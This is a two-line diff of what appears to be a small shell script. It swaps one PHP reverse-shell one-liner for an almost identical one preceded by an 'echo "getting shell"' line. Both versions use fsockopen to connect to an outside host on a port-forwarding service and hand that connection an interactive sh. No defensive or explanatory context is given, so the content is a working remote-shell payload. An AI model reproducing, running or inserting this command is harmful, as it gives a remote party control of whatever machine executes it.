@@ -1,1 +1,2 @@
-php -r '$sock=fsockopen("siddharth-hadkhale-52871.portmap.host",52871);shell_exec("sh <&3 >&3 2>&3");'
+echo "getting shell"
+php -r '$sock=fsockopen("siddharth-hadkhale-52871.portmap.host",52871);shell_exec("sh <&3 >&3 2>&3");' #
